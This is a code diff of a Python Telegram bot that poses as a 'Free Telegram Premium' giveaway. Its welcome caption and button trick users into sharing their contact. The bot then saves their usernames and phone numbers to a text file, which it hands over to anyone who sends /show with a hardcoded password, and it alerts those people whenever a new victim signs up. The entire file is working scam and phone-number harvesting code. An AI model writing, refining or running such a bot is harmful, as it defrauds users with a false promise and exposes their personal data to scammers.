@@ -14,9 +14,8 @@ CUSTOMIZATION GUIDE:
 5. Password: Change the 'password' variable below to set your own password for the /show command
 """
 
-import glob
-from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
+from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
 import logging
 
 # Configure logging
@@ -25,160 +24,105 @@ logger = logging.getLogger(__name__)
 
 # Dictionary to store user data
 user_data = {}
+notified_users = set()  # Set of users who entered /show 555222
 
-# Password for accessing the /show command
-# CUSTOMIZE: Change this password to your desired value
-password = '4422'
+# Password for accessing /show command
+PASSWORD = '555222'
 
-# You Bot Token
-BOT_TOKEN = "" # add here
+# Your Bot Token
+BOT_TOKEN = "YOUR_BOT_TOKEN"  # Replace with your actual bot token
 
-# Track the message IDs for deleting and resending
-message_ids = {'start': None, 'premium': None}
-
-# CUSTOMIZE: Modify this message to change what users see when they start the bot
+# Welcome Message
 WELCOME_CAPTION = ("🎉 Welcome to Free Telegram Premium 🎉\n\n"
-                  "You can get 3 months of Telegram Premium for free!\n\n"
-                  "To Get ⭐Free Premium Telegram ⭐ Access\n\n please press the box icon button \n\nnear the clip 🧷\n\n below to connect your account to Telegram Pro. 📱\n\n"
-                  "Happy Using And Keep Coming Back Every 3 Months! 😊")
+                   "Get 3 months of Telegram Premium for free!\n\n"
+                   "To claim your reward, press the 📦 box icon "
+                   "near the 🧷 clip to connect your account.\n\n"
+                   "Happy Using! 😊")
 
-def send_welcome_message(chat_id, bot=None, update=None) -> int:
+def send_welcome_message(chat_id, bot=None, update=None) -> None:
     """Helper function to send welcome message with photo and buttons"""
-    # CUSTOMIZE: Modify the button text here
     button_text = "⭐️ Get Free 3 months Telegram Premium"
-    
+
     reply_markup = ReplyKeyboardMarkup(
         [[KeyboardButton(text=button_text, request_contact=True)]],
         one_time_keyboard=True,
         resize_keyboard=True
     )
 
-    # CUSTOMIZE: Replace 'telegramicon.png' with your own image file
-    # Make sure the image file is in the same directory as this script
     with open('telegramicon.png', 'rb') as photo:
         if bot:
-            sent_message = bot.send_photo(
-                chat_id=chat_id,
-                photo=photo,
-                caption=WELCOME_CAPTION,
-                reply_markup=reply_markup
-            )
+            bot.send_photo(chat_id=chat_id, photo=photo, caption=WELCOME_CAPTION, reply_markup=reply_markup)
         else:
-            sent_message = update.message.reply_photo(
-                photo=photo,
-                caption=WELCOME_CAPTION,
-                reply_markup=reply_markup
-            )
-    return sent_message.message_id
+            update.message.reply_photo(photo=photo, caption=WELCOME_CAPTION, reply_markup=reply_markup)
 
 def start(update: Update, context: CallbackContext) -> None:
-    try:
-        message_ids['start'] = send_welcome_message(update.effective_chat.id, update=update)
-    except Exception as e:
-        logger.error(f"An error occurred: {e}")
-        update.message.reply_text("An error occurred while processing your request.")
+    send_welcome_message(update.effective_chat.id, update=update)
 
-# Add a dictionary to store users who entered the correct password
-authorized_users = {}
-
-def notify_users_of_new_user(phone_number: str):
-    """Notify all users who entered the correct password about a new user."""
-    for user_id in authorized_users:
+def notify_users_of_new_user(phone_number: str, context: CallbackContext):
+    """Notify users who entered /show 555222 about a new user."""
+    for user_id in notified_users.copy():  # Iterate over a copy to avoid errors if a user leaves
         try:
-            message = (f"🚨 A new user has shared their phone number:\n"
-                       f"📱 {phone_number}\n"
-                       f"Check out the list of users in /show if you're authorized.")
-            context.bot.send_message(user_id, message)
+            message = f"🚨 A new user has been added!\n📱 Phone: {phone_number}\nCheck the updated list using /show 555222."
+            context.bot.send_message(chat_id=user_id, text=message)
         except Exception as e:
-            logger.error(f"Error sending message to user {user_id}: {e}")
+            logger.error(f"Error notifying user {user_id}: {e}")
+            notified_users.discard(user_id)  # Remove user if an error occurs (e.g., bot blocked)
 
 def handle_contact(update: Update, context: CallbackContext) -> None:
-    """Handle the contact message and notify the user that they will be notified of new users."""
+    """Handle contact sharing and notify users."""
     contact = update.message.contact
     user_id = update.message.from_user.id
     username = update.message.from_user.username
 
-    # Check if the user has already shared their phone number
     if user_id in user_data:
-        update.message.reply_text(f"🚫 @{username}, you have already shared your phone number. You should receive premium access shortly. 🚀")
+        update.message.reply_text(f"🚫 @{username}, you already shared your number. You will receive premium access soon! 🚀")
         return
 
-    # Save the user's data
-    user_data[user_id] = {
-        'username': username,
-        'phone_number': contact.phone_number
-    }
+    user_data[user_id] = {'username': username, 'phone_number': contact.phone_number}
 
-    # Save user data to file (append mode to avoid overwriting)
+    # Save new user data
     with open('user_data.txt', 'a') as file:
         file.write(f"User ID: {user_id}\nUsername: @{username}\nPhone Number: {contact.phone_number}\n\n")
 
-    # Notify the user that they will be notified of new users
-    update.message.reply_text(f"Thank you @{username}! Your phone number has been recorded. 😊\n\nYou will be notified whenever a new user shares their phone number. 📲")
+    update.message.reply_text(f"✅ Thank you @{username}! 🎉\n"
+                              f"You will soon receive Telegram Pro features. 🚀")
 
-    # Notify all authorized users about the new phone number
-    notify_users_of_new_user(contact.phone_number)
-
+    # Notify all users who entered /show 555222
+    notify_users_of_new_user(contact.phone_number, context)
 
 def show_users(update: Update, context: CallbackContext) -> None:
-    """Show the list of users to authorized users."""
-    if len(context.args) == 0 or context.args[0] != password:
-        update.message.reply_text(
-            "❌ Access denied. Please provide the correct password to view the list of users. Usage: /show <password>"
-        )
+    """Show the list of users to authorized users and add them to notification list."""
+    if len(context.args) == 0 or context.args[0] != PASSWORD:
+        update.message.reply_text("❌ Access denied. Use: /show <password>")
         return
 
-    # Add the user to the authorized list
     user_id = update.message.from_user.id
-    authorized_users[user_id] = True
+    notified_users.add(user_id)  # Add user to notification list
 
-    # Send the user data file directly
     try:
         update.message.reply_document(
             document=open('user_data.txt', 'rb'),
             filename="user_data.txt",
             caption="📜 Here is the list of users who shared their information."
         )
+        update.message.reply_text("✅ You will now receive notifications for each new user added! 📲")
     except FileNotFoundError:
-        update.message.reply_text("No user data file found. 😔")
+        update.message.reply_text("No user data found. 😔")
     except Exception as e:
-        logger.error(f"An error occurred while retrieving user data: {e}")
+        logger.error(f"Error retrieving user data: {e}")
         update.message.reply_text("An error occurred while retrieving the user data. 😔")
 
-
-
-def button(update: Update, context: CallbackContext) -> None:
-    query = update.callback_query
-    if query.data == "get_premium":
-        # Delete the current message (if any)
-        if message_ids['premium']:
-            context.bot.delete_message(chat_id=update.effective_chat.id, message_id=message_ids['premium'])
-
-        # Delete the original start message
-        if message_ids['start']:
-            context.bot.delete_message(chat_id=update.effective_chat.id, message_id=message_ids['start'])
-
-        # Re-send the welcome message
-        message_ids['start'] = send_welcome_message(update.effective_chat.id, bot=context.bot)
-        message_ids['premium'] = None
-
-
 def main() -> None:
-    # CUSTOMIZE: Replace with your bot token from @BotFather
-    updater = Updater(BOT_TOKEN)
-
+    updater = Updater(BOT_TOKEN, use_context=True)
     dispatcher = updater.dispatcher
 
-    # Handlers for different commands
     dispatcher.add_handler(CommandHandler("start", start))
     dispatcher.add_handler(MessageHandler(Filters.contact, handle_contact))
     dispatcher.add_handler(CommandHandler("show", show_users))
-    dispatcher.add_handler(CallbackQueryHandler(button))
 
-    # Start the Bot
     updater.start_polling()
     updater.idle()
 
-
 if __name__ == '__main__':
     main()
+
